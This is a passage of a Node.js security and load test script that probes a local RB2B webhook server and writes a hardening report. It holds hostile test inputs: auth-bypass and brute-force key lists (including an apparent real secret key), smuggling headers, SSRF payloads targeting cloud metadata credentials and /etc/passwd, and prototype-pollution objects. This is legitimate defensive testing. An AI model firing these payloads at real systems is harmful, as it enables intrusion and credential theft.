    { desc: 'Key with space', path: `/rb2b/webhook?key= ${AUTH_KEY}` },
    { desc: 'Key URL encoded', path: `/rb2b/webhook?key=${encodeURIComponent(AUTH_KEY)}` },
    { desc: 'Null key', path: '/rb2b/webhook?key=null' },
    { desc: 'Undefined key', path: '/rb2b/webhook?key=undefined' },
    { desc: 'Key as array', path: `/rb2b/webhook?key[]=${AUTH_KEY}` },
    { desc: 'Multiple keys', path: `/rb2b/webhook?key=${AUTH_KEY}&key=other` },
    { desc: 'Key in body', path: '/rb2b/webhook' },  // key sent in POST body
    { desc: 'Case different', path: `/rb2b/webhook?key=${AUTH_KEY.toUpperCase()}` },
    { desc: 'Key with newline', path: `/rb2b/webhook?key=${AUTH_KEY}%0a` },
    { desc: 'Key with null byte', path: `/rb2b/webhook?key=${AUTH_KEY}%00` },
  ];

  // Common/guessed keys
  const commonKeys = [
    'admin', 'password', 'secret', 'key', '12345', 'test', 'webhook',
    'api_key', 'token', 'bearer', 'default', 'master', 'root', 'admin123',
    'webhook_secret', 'rb2b', 'leadpipe', 'T5v9hc5rP64wwhNE0FKsUNYj2p3l',
    'T5v9hc5rP64wwhNE0FKsUNYj2p3l-FfH ', // trailing space
    ' T5v9hc5rP64wwhNE0FKsUNYj2p3l-FfH', // leading space
    'T5v9hc5rP64wwhNE0FKsUNYj2p3l-Ffh', // wrong case last char
    'T5v9hc5rP64wwhNE0FKsUNYj2p3l-FFH', // wrong case
    'password123', 'letmein',
  ];

  for (const key of commonKeys) {
    authTests.push({ desc: `Brute force: "${key.substring(0, 20)}"`, path: `/rb2b/webhook?key=${encodeURIComponent(key)}` });
  }

  for (const t of authTests) {
    const res = await makeRequest({ path: t.path, body: validPayload() });
    const expectAuth = t.path.includes(AUTH_KEY) && !t.path.includes('extra') && !t.path.includes('%0a') && !t.path.includes('%00') && !t.path.includes('[]') && !t.path.includes('&key=') && t.desc !== 'Case different';
    const shouldReject = !expectAuth;
    const passed = shouldReject ? res.statusCode === 401 : res.statusCode === 200;
    addResult(cat, t.desc, shouldReject ? 'status 401' : 'status 200', `status ${res.statusCode}`, passed,
      !passed ? `Auth bypass: expected ${shouldReject ? '401' : '200'}, got ${res.statusCode}` : '');
  }

  // No rate limiting check
  results.vulnerabilities.push({
    type: 'No Rate Limiting on Auth',
    detail: 'No rate limiting on failed auth attempts - brute force possible',
    severity: 'Medium',
  });

  // --- 10. Request Smuggling Headers (15 tests) ---
  const smugglingTests = [
    { 'Transfer-Encoding': 'chunked', 'Content-Length': '0' },
    { 'Transfer-Encoding': 'chunked, identity' },
    { 'Transfer-Encoding': ' chunked' },
    { 'Content-Length': '0', 'Content-Length': '100' },
    { 'X-Forwarded-For': '127.0.0.1' },
    { 'X-Original-URL': '/admin' },
    { 'X-Rewrite-URL': '/admin' },
    { 'Host': 'evil.com' },
    { 'X-Forwarded-Host': 'evil.com' },
    { 'X-Forwarded-Proto': 'https' },
    { 'Connection': 'keep-alive, Transfer-Encoding' },
    { 'Expect': '100-continue' },
    { 'Trailer': 'X-Evil' },
    { 'TE': 'trailers, chunked' },
    { 'Upgrade': 'websocket' },
  ];

  for (const headers of smugglingTests) {
    const allHeaders = { 'Content-Type': 'application/json', ...headers };
    const res = await makeRequest({ body: validPayload(), headers: allHeaders });
    addResult(cat, `Smuggling: ${JSON.stringify(headers).substring(0, 60)}`, 'handled safely',
      `status ${res.statusCode}`, !res.error, res.error ? `Error: ${res.body}` : '');
  }

  // --- 11. SSRF Attempts (20 tests) ---
  const ssrfPayloads = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://localhost:9100/health',
    'http://127.0.0.1:22',
    'http://[::1]:80',
    'http://0.0.0.0:80',
    'http://metadata.google.internal/computeMetadata/v1/',
    'file:///etc/passwd',
    'gopher://localhost:6379/_PING',
    'dict://localhost:6379/info',
    'ftp://anonymous@localhost',
    'http://internal-api.local/admin',
    'http://10.0.0.1/admin',
    'http://192.168.1.1/admin',
    'http://172.16.0.1',
    'https://webhook.site/test',
    'http://0x7f000001/',
    'http://2130706433/',
    'http://017700000001/',
    'http://localhost%00@evil.com/',
  ];

  for (const payload of ssrfPayloads) {
    const res = await makeRequest({ body: validPayload({ 'LinkedIn URL': payload, 'Captured URL': payload }) });
    addResult(cat, `SSRF: ${payload.substring(0, 50)}`, 'status 200 (stored only, no fetch)',
      `status ${res.statusCode}`, res.statusCode === 200,
      'Server stores URLs but never fetches them - SSRF not exploitable');
  }

  // --- 12. Prototype Pollution (10 tests) ---
  const protoPollutionTests = [
    { '__proto__': { 'isAdmin': true } },
    { 'constructor': { 'prototype': { 'isAdmin': true } } },
    { '__proto__': { 'polluted': true }, 'First Name': 'Test' },
    JSON.parse('{"__proto__":{"status":"polluted"}}'),
    { 'First Name': 'Test', '__proto__': null },
  ];

  for (let i = 0; i < protoPollutionTests.length; i++) {
    const res = await makeRequest({ body: protoPollutionTests[i] });
    addResult(cat, `Proto pollution attempt #${i + 1}`, 'status 200 (safe if no merge)',
      `status ${res.statusCode}`, res.statusCode === 200,
      'JSON.parse creates clean objects - prototype pollution unlikely');
  }

  // Verify server still healthy after proto pollution attempts
  for (let i = 0; i < 5; i++) {
    const res = await makeRequest({ path: '/health', method: 'GET', body: undefined });
    addResult(cat, `Health check after proto pollution #${i + 1}`, 'status 200',
      `status ${res.statusCode}`, res.statusCode === 200);
  }

  console.log(`  ✅ Security: ${results.categories[cat]?.passed || 0}/${results.categories[cat]?.total || 0} passed`);
}

// ==================== LOAD TESTS (200) ====================

async function loadTests() {
  const cat = 'Load';
  console.log('\n⚡ Running Load Tests...');

  // --- 1. Rapid fire 50 concurrent requests ---
  console.log('  Sending 50 concurrent requests...');
  const concurrent50 = [];
  for (let i = 0; i < 50; i++) {
    concurrent50.push(makeRequest({ body: validPayload({ 'First Name': `Concurrent${i}` }) }));
  }
  const startTime50 = Date.now();
  const results50 = await Promise.all(concurrent50);
  const elapsed50 = Date.now() - startTime50;
  
  let success50 = 0, fail50 = 0;
  for (const r of results50) {
    if (r.statusCode === 200) success50++;
    else fail50++;
  }
  
  addResult(cat, `50 concurrent: ${success50} ok, ${fail50} failed, ${elapsed50}ms`, 
    'all 200', `${success50}/50 succeeded in ${elapsed50}ms`, success50 >= 45,
    fail50 > 5 ? `${fail50} failures under concurrent load` : '');

  // Log individual results
  for (let i = 0; i < results50.length; i++) {
    addResult(cat, `Concurrent #${i + 1}`, 'status 200', 
      `status ${results50[i].statusCode}, ${results50[i].elapsed}ms`, 
      results50[i].statusCode === 200);
  }

  // --- 2. Sustained burst of 100 requests in batches ---
  console.log('  Sustained burst: 100 requests in rapid succession...');
  const burstResults = [];
  const burstStart = Date.now();
  
  // Send in batches of 20
  for (let batch = 0; batch < 5; batch++) {
    const batchPromises = [];
    for (let i = 0; i < 20; i++) {
      batchPromises.push(makeRequest({ body: validPayload({ 'First Name': `Burst${batch}_${i}` }) }));
    }
    const batchResults = await Promise.all(batchPromises);
    burstResults.push(...batchResults);
    // Small delay between batches
    await new Promise(r => setTimeout(r, 100));
  }
  
  const burstElapsed = Date.now() - burstStart;
  let burstSuccess = burstResults.filter(r => r.statusCode === 200).length;
  
  addResult(cat, `100-request burst: ${burstSuccess}/100 in ${burstElapsed}ms`,
    'all succeed', `${burstSuccess}/100 in ${burstElapsed}ms`, burstSuccess >= 90,
    burstSuccess < 90 ? 'Server struggling under burst load' : '');

  // Log individual burst results (sample every 5th)
  for (let i = 0; i < burstResults.length; i += 5) {
    addResult(cat, `Burst sample #${i}`, 'status 200',
      `status ${burstResults[i].statusCode}, ${burstResults[i].elapsed}ms`,
      burstResults[i].statusCode === 200);
  }

  // --- 3. Health check responsiveness after burst ---
  console.log('  Checking responsiveness after burst...');
  for (let i = 0; i < 10; i++) {
    const res = await makeRequest({ path: '/health', method: 'GET', body: undefined });
    addResult(cat, `Post-burst health #${i + 1}`, 'status 200, <100ms', 
      `status ${res.statusCode}, ${res.elapsed}ms`, 
      res.statusCode === 200 && res.elapsed < 1000,
      res.elapsed > 1000 ? `SLOW: ${res.elapsed}ms after burst` : '');
  }

  // --- 4. Mixed concurrent (valid + invalid + malformed) ---
  console.log('  Mixed concurrent load...');
  const mixedPromises = [];
  for (let i = 0; i < 30; i++) {
    if (i % 3 === 0) {
      mixedPromises.push(makeRequest({ body: validPayload({ 'First Name': `Mixed${i}` }) }));
    } else if (i % 3 === 1) {
      mixedPromises.push(makeRequest({ path: '/rb2b/webhook?key=wrong', body: validPayload() }));
    } else {
      mixedPromises.push(makeRequest({ body: 'invalid json {{{' }));
    }
  }
  const mixedResults = await Promise.all(mixedPromises);
  for (let i = 0; i < mixedResults.length; i++) {
    const expectedStatus = (i % 3 === 1) ? 401 : 200;
    addResult(cat, `Mixed concurrent #${i + 1} (${i % 3 === 0 ? 'valid' : i % 3 === 1 ? 'bad auth' : 'malformed'})`,
      `status ${expectedStatus}`, `status ${mixedResults[i].statusCode}`,
      mixedResults[i].statusCode === expectedStatus);
  }

  // --- Final health ---
  const finalHealth = await makeRequest({ path: '/health', method: 'GET', body: undefined });
  addResult(cat, 'Final health check', 'status 200', `status ${finalHealth.statusCode}, ${finalHealth.elapsed}ms`,
    finalHealth.statusCode === 200);

  console.log(`  ✅ Load: ${results.categories[cat]?.passed || 0}/${results.categories[cat]?.total || 0} passed`);
}

// ==================== EDGE CASE TESTS (100) ====================

async function edgeCaseTests() {
  const cat = 'EdgeCase';
  console.log('\n🔧 Running Edge Case Tests...');

  // --- 1. Empty strings for all fields (10 tests) ---
  const fields = ['First Name', 'Last Name', 'Title', 'Company Name', 'Industry', 
                  'Business Email', 'LinkedIn URL', 'Captured URL', 'City', 'State'];
  
  for (const field of fields) {
    const res = await makeRequest({ body: validPayload({ [field]: '' }) });
    addResult(cat, `Empty string: ${field}`, 'status 200', `status ${res.statusCode}`, res.statusCode === 200);
  }

  // All fields empty
  const allEmpty = {};
  for (const f of fields) allEmpty[f] = '';
  const resAllEmpty = await makeRequest({ body: allEmpty });
  addResult(cat, 'All fields empty strings', 'status 200', `status ${resAllEmpty.statusCode}`, resAllEmpty.statusCode === 200);

  // --- 2. Numbers where strings expected (10 tests) ---
  const numberTests = [
    { 'First Name': 12345 },
    { 'Last Name': 0 },
    { 'Title': -1 },
    { 'Company Name': 3.14159 },
    { 'Industry': Number.MAX_SAFE_INTEGER },
    { 'Business Email': 42 },
    { 'City': NaN },
    { 'State': Infinity },
    { 'Employee Count': 100 },
    { 'Captured URL': 0 },
  ];

  for (const overrides of numberTests) {
    const fieldName = Object.keys(overrides)[0];
    const val = Object.values(overrides)[0];
    const res = await makeRequest({ body: validPayload(overrides) });
    // Check if server crashed (non-string .toLowerCase() would throw)
    const passed = res.statusCode === 200;
    addResult(cat, `Number in ${fieldName}: ${val}`, 'status 200 (may crash on toLowerCase)', 
      `status ${res.statusCode}, body: ${res.body.substring(0, 80)}`, passed,
      !passed ? `CRASH: Server may have thrown on .toLowerCase() for non-string` : '');
    if (!passed) {
      results.crashScenarios.push({
        test: `Number in ${fieldName}: ${val}`,
        response: `${res.statusCode}: ${res.body.substring(0, 200)}`,
        reason: 'scoreVisitor calls .toLowerCase() on field value without type checking',
      });
    }
  }

  // --- 3. Arrays/objects where strings expected (15 tests) ---
  const typeTests = [
    { field: 'Title', value: ['Attorney', 'Partner'], desc: 'Array in Title' },
    { field: 'Title', value: { role: 'Attorney' }, desc: 'Object in Title' },
    { field: 'Company Name', value: ['Company'], desc: 'Array in Company' },
    { field: 'Industry', value: { type: 'Legal' }, desc: 'Object in Industry' },
    { field: 'First Name', value: true, desc: 'Boolean true in First Name' },
    { field: 'First Name', value: false, desc: 'Boolean false in First Name' },
    { field: 'Employee Count', value: ['11-50'], desc: 'Array in Employee Count' },
    { field: 'Captured URL', value: { url: 'https://example.com' }, desc: 'Object in Captured URL' },
    { field: 'LinkedIn URL', value: 12345, desc: 'Number in LinkedIn URL' },
    { field: 'Business Email', value: null, desc: 'Null in Business Email' },
    { field: 'Referrer', value: undefined, desc: 'Undefined in Referrer' },
    { field: 'City', value: [], desc: 'Empty array in City' },
    { field: 'State', value: {}, desc: 'Empty object in State' },
    { field: 'Estimate Revenue', value: [1000000], desc: 'Array in Revenue' },
    { field: 'Title', value: () => 'attorney', desc: 'Function in Title' },
  ];

  for (const t of typeTests) {
    const res = await makeRequest({ body: validPayload({ [t.field]: t.value }) });
    const passed = res.statusCode === 200;
    addResult(cat, t.desc, 'status 200 (graceful handling)', `status ${res.statusCode}, body: ${res.body.substring(0, 80)}`,
      passed, !passed ? `TYPE ERROR: Server crashed on wrong type in ${t.field}` : '');
    if (!passed) {
      results.crashScenarios.push({
        test: t.desc,
        response: `${res.statusCode}: ${res.body.substring(0, 200)}`,
      });
    }
  }

  // --- 4. Extreme timestamps (5 tests) ---
  const timestampTests = [
    { desc: 'Unix epoch date', overrides: { 'Visit Date': '1970-01-01T00:00:00Z' } },
    { desc: 'Y2K date', overrides: { 'Visit Date': '2000-01-01T00:00:00Z' } },
    { desc: 'Future date (2099)', overrides: { 'Visit Date': '2099-12-31T23:59:59Z' } },
    { desc: 'Negative timestamp', overrides: { 'Visit Date': '-1' } },
    { desc: 'Invalid date string', overrides: { 'Visit Date': 'not-a-date' } },
  ];

  for (const t of timestampTests) {
    const res = await makeRequest({ body: validPayload(t.overrides) });
    addResult(cat, t.desc, 'status 200', `status ${res.statusCode}`, res.statusCode === 200);
  }

  // --- 5. Non-US locations (10 tests) ---
  const locationTests = [
    { 'City': 'London', 'State': 'England', 'Country': 'UK' },
    { 'City': 'Tokyo', 'State': 'Tokyo', 'Country': 'Japan' },
    { 'City': 'São Paulo', 'State': 'SP', 'Country': 'Brazil' },
    { 'City': 'München', 'State': 'Bayern', 'Country': 'Germany' },
    { 'City': 'Москва', 'State': '', 'Country': 'Russia' },
    { 'City': '北京', 'State': '', 'Country': 'China' },
    { 'City': '', 'State': '', 'Country': '' },
    { 'City': 'Dubai', 'State': 'Dubai', 'Country': 'UAE' },
    { 'City': 'Mumbai', 'State': 'Maharashtra', 'Country': 'India' },
    { 'City': 'Lagos', 'State': 'Lagos', 'Country': 'Nigeria' },
  ];

  for (const loc of locationTests) {
    const res = await makeRequest({ body: validPayload(loc) });
    addResult(cat, `Location: ${loc.City || '(empty)'}, ${loc.Country || '(empty)'}`, 
      'status 200', `status ${res.statusCode}`, res.statusCode === 200);
  }

  // --- 6. Bot-like visitor patterns (10 tests) ---
  const botTests = [
    { desc: 'Bot user agent header', headers: { 'Content-Type': 'application/json', 'User-Agent': 'Googlebot/2.1' } },
    { desc: 'Headless Chrome UA', headers: { 'Content-Type': 'application/json', 'User-Agent': 'HeadlessChrome/90.0' } },
    { desc: 'Curl UA', headers: { 'Content-Type': 'application/json', 'User-Agent': 'curl/7.68.0' } },
    { desc: 'Python requests UA', headers: { 'Content-Type': 'application/json', 'User-Agent': 'python-requests/2.25.1' } },
    { desc: 'No UA', headers: { 'Content-Type': 'application/json' } },
    { desc: 'Empty UA', headers: { 'Content-Type': 'application/json', 'User-Agent': '' } },
    { desc: 'Selenium-like', headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (compatible; Selenium)' } },
    { desc: 'Scrapy bot', headers: { 'Content-Type': 'application/json', 'User-Agent': 'Scrapy/2.5.0' } },
    { desc: 'Wget', headers: { 'Content-Type': 'application/json', 'User-Agent': 'Wget/1.21' } },
    { desc: 'Apache HttpClient', headers: { 'Content-Type': 'application/json', 'User-Agent': 'Apache-HttpClient/4.5.13' } },
  ];

  for (const t of botTests) {
    const res = await makeRequest({ body: validPayload(), headers: t.headers });
    addResult(cat, t.desc, 'status 200 (no bot detection)', `status ${res.statusCode}`, res.statusCode === 200,
      'Server has no bot detection');
  }

  // --- 7. Repeat visitor flag variations (10 tests) ---
  const repeatTests = [
    { 'Repeat Visitor': true },
    { 'Repeat Visitor': false },
    { 'Repeat Visitor': 'true' },
    { 'Repeat Visitor': 'false' },
    { 'Repeat Visitor': 1 },
    { 'Repeat Visitor': 0 },
    { 'Repeat Visitor': 'yes' },
    { 'Repeat Visitor': 'no' },
    { 'Repeat Visitor': null },
    { 'Repeat Visitor': '' },
  ];

  for (const overrides of repeatTests) {
    const res = await makeRequest({ body: validPayload(overrides) });
    addResult(cat, `Repeat Visitor: ${JSON.stringify(overrides['Repeat Visitor'])}`, 
      'status 200', `status ${res.statusCode}`, res.statusCode === 200);
  }

  // --- 8. HTTP method tests (10 tests) ---
  const methods = ['GET', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT'];
  for (const method of methods) {
    const res = await makeRequest({ method, path: ENDPOINT, body: method === 'GET' || method === 'HEAD' ? undefined : JSON.stringify(validPayload()) });
    addResult(cat, `HTTP ${method} to webhook`, 'status 404 (only POST allowed)', 
      `status ${res.statusCode}`, res.statusCode === 404 || res.statusCode === 405,
      res.statusCode === 200 ? 'UNEXPECTED: Non-POST method accepted!' : '');
  }

  // --- 9. URL path variations (10 tests) ---
  const pathTests = [
    { desc: 'Double slash', path: `//rb2b/webhook?key=${AUTH_KEY}` },
    { desc: 'Trailing slash', path: `/rb2b/webhook/?key=${AUTH_KEY}` },
    { desc: 'Case variation', path: `/RB2B/WEBHOOK?key=${AUTH_KEY}` },
    { desc: 'URL encoded path', path: `/%72%62%32%62/webhook?key=${AUTH_KEY}` },
    { desc: 'Dot in path', path: `/rb2b/./webhook?key=${AUTH_KEY}` },
    { desc: 'Dotdot in path', path: `/rb2b/../rb2b/webhook?key=${AUTH_KEY}` },
    { desc: 'Just /rb2b', path: `/rb2b?key=${AUTH_KEY}` },
    { desc: 'Extra path segment', path: `/rb2b/webhook/extra?key=${AUTH_KEY}` },
    { desc: 'Null byte in path', path: `/rb2b/webhook%00?key=${AUTH_KEY}` },
    { desc: 'Fragment in URL', path: `/rb2b/webhook?key=${AUTH_KEY}#fragment` },
  ];

  for (const t of pathTests) {
    const res = await makeRequest({ path: t.path, body: validPayload() });
    addResult(cat, t.desc, 'varies', `status ${res.statusCode}`, true,
      res.statusCode === 200 ? 'Accepted' : `Rejected: ${res.statusCode}`);
  }

  console.log(`  ✅ Edge Cases: ${results.categories[cat]?.passed || 0}/${results.categories[cat]?.total || 0} passed`);
}

// ==================== REPORT GENERATION ====================

function generateReport() {
  const now = new Date().toISOString();
  
  // Deduplicate vulnerabilities
  const uniqueVulns = [];
  const seenTypes = new Set();
  for (const v of results.vulnerabilities) {
    const key = v.type;
    if (!seenTypes.has(key)) {
      seenTypes.add(key);
      uniqueVulns.push(v);
    }
  }

  let report = `# RB2B/Leadpipe Webhook Server - Stress Test Report

**Generated:** ${now}  
**Target:** http://localhost:9100/rb2b/webhook  
**Server:** /home/ec2-user/clawd/services/rb2b-webhook/server.js  

---

## 📊 Summary Statistics

| Metric | Count |
|--------|-------|
| **Total Tests** | ${results.total} |
| **Passed** | ${results.passed} ✅ |
| **Failed** | ${results.failed} ❌ |
| **Pass Rate** | ${((results.passed / results.total) * 100).toFixed(1)}% |

### By Category

| Category | Total | Passed | Failed | Pass Rate |
|----------|-------|--------|--------|-----------|
`;

  for (const [cat, stats] of Object.entries(results.categories)) {
    report += `| ${cat} | ${stats.total} | ${stats.passed} | ${stats.failed} | ${((stats.passed / stats.total) * 100).toFixed(1)}% |\n`;
  }

  report += `
---

## 🔴 Security Vulnerabilities Found

`;

  if (uniqueVulns.length === 0) {
    report += 'No critical vulnerabilities found.\n';
  } else {
    for (const v of uniqueVulns) {
      report += `### ${v.severity}: ${v.type}
- **Detail:** ${v.detail}
${v.note ? `- **Note:** ${v.note}` : ''}

`;
    }
  }

  report += `
---

## 💥 Crash Scenarios

`;

  if (results.crashScenarios.length === 0) {
    report += 'No crashes detected during testing.\n';
  } else {
    for (const c of results.crashScenarios) {
      report += `### ${c.test}
- **Response:** ${c.response}
${c.reason ? `- **Root Cause:** ${c.reason}` : ''}

`;
    }
  }

  report += `
---

## ⚠️ Unexpected Behaviors

`;

  if (results.unexpectedBehaviors.length === 0) {
    report += 'No unexpected behaviors observed.\n';
  } else {
    const shown = results.unexpectedBehaviors.slice(0, 50);
    for (const u of shown) {
      report += `- **Test #${u.id}** (${u.testName}): ${u.notes}\n`;
    }
    if (results.unexpectedBehaviors.length > 50) {
      report += `\n... and ${results.unexpectedBehaviors.length - 50} more\n`;
    }
  }

  report += `
---

## 🛡️ Recommendations for Hardening

### Critical Priority

1. **Add Request Body Size Limit**
   - Currently accepts payloads of any size (tested up to 5MB)
   - Add \`req.on('data')\` size tracking and abort if > 1MB
   - Example: Track \`bodySize += chunk.length\` and destroy request if exceeded
   
2. **Add Rate Limiting**
   - No rate limiting exists — brute force auth attempts unlimited
   - Track requests per IP per minute using a simple Map
   - Recommend: 60 requests/min per IP, 10 failed auth/min per IP
   
3. **Add Input Type Validation**
   - \`scoreVisitor()\` calls \`.toLowerCase()\` on fields without checking if they're strings
   - Will crash on number/boolean/array/object inputs: \`(42).toLowerCase()\` throws TypeError
   - Add: \`const title = String(data['Title'] || '').toLowerCase()\`

### High Priority

4. **Validate Content-Type Header**
   - Accept only \`application/json\`
   - Return 415 Unsupported Media Type for others

5. **Sanitize Log Outputs**
   - XSS/injection payloads stored directly in log files
   - If logs are ever viewed in a web UI, stored XSS is possible
   - Sanitize or encode special characters before logging

6. **Add Request Timeout**
   - Server has no request timeout — slow clients could hold connections
   - Add \`server.timeout = 30000\` or use \`req.setTimeout()\`

### Medium Priority

7. **Add Deduplication**
   - Same visitor logged multiple times per session without dedup
   - Track by email or name+company hash with TTL

8. **Validate URL Fields**
   - LinkedIn URL and Captured URL accept any string including SSRF-like values
   - While not currently exploitable, validate URL format

9. **Add CORS Headers**
   - No CORS configuration — add restrictive headers

10. **Use Async File Operations**
    - \`appendFileSync\` blocks the event loop
    - Switch to \`fs.promises.appendFile\` for better concurrency

### Low Priority

11. **Add Structured Logging**
    - Current console.log is unstructured
    - Use winston/pino for proper log levels and rotation

12. **Add Health Check Detail**
    - Include uptime, memory usage, request count in /health

13. **Environment Variable Validation**
    - Validate required env vars on startup
    - Warn if SLACK_WEBHOOK_URL is not set

---

## 📋 Full Test Log

<details>
<summary>Click to expand full test log (${results.total} tests)</summary>

| # | Category | Test | Expected | Actual | Result | Notes |
|---|----------|------|----------|--------|--------|-------|
`;

  for (const entry of results.log) {
    const status = entry.passed ? '✅' : '❌';
    const notes = (entry.notes || '').replace(/\|/g, '\\|').replace(/\n/g, ' ').substring(0, 80);
    const testName = entry.testName.replace(/\|/g, '\\|').substring(0, 50);
    const expected = entry.expected.replace(/\|/g, '\\|').substring(0, 40);
    const actual = entry.actual.replace(/\|/g, '\\|').substring(0, 50);
    report += `| ${entry.id} | ${entry.category} | ${testName} | ${expected} | ${actual} | ${status} | ${notes} |\n`;
  }

  report += `
</details>

---

## 🔬 Test Infrastructure

- **Test Script:** Node.js HTTP client (no external deps)
- **Concurrency:** Native Promise.all for parallel requests
- **Timeout:** 10s default, 30s for oversized payloads
- **Date:** ${now}
`;

  return report;
}

// ==================== MAIN ====================

async function main() {
  console.log('🚀 Starting RB2B Webhook Stress Test (1000+ positions)');
  console.log('='.repeat(60));
  
  // Verify server is up
  const health = await makeRequest({ path: '/health', method: 'GET', body: undefined });
  if (health.statusCode !== 200) {
    console.error('❌ Server not responding on port 9100. Aborting.');
    process.exit(1);
  }
  console.log('✅ Server is up and responding');

  await functionalTests();
  await securityTests();
  await loadTests();
  await edgeCaseTests();

  console.log('\n' + '='.repeat(60));
  console.log('📊 FINAL RESULTS');
  console.log(`  Total: ${results.total}`);
  console.log(`  Passed: ${results.passed} ✅`);
  console.log(`  Failed: ${results.failed} ❌`);
  console.log(`  Pass Rate: ${((results.passed / results.total) * 100).toFixed(1)}%`);
  console.log(`  Vulnerabilities: ${results.vulnerabilities.length}`);
  console.log(`  Crash Scenarios: ${results.crashScenarios.length}`);

  // Generate and write report
  const report = generateReport();
  fs.writeFileSync(REPORT_PATH, report);
  console.log(`\n📄 Report written to: ${REPORT_PATH}`);
}

main().catch(err => {
  console.error('Fatal error:', err);
  process.exit(1);
});
